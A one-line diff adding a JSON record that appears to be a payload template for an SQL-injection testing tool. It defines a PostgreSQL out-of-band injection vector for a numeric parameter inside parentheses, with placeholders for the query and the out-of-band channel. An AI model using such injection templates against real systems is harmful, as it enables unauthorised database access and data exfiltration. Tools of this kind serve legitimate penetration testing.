@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "oob", "boundary": {"prefix": ")", "suffix": "", "type": "paren-num"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "pgsql oob: num in paren bare"}
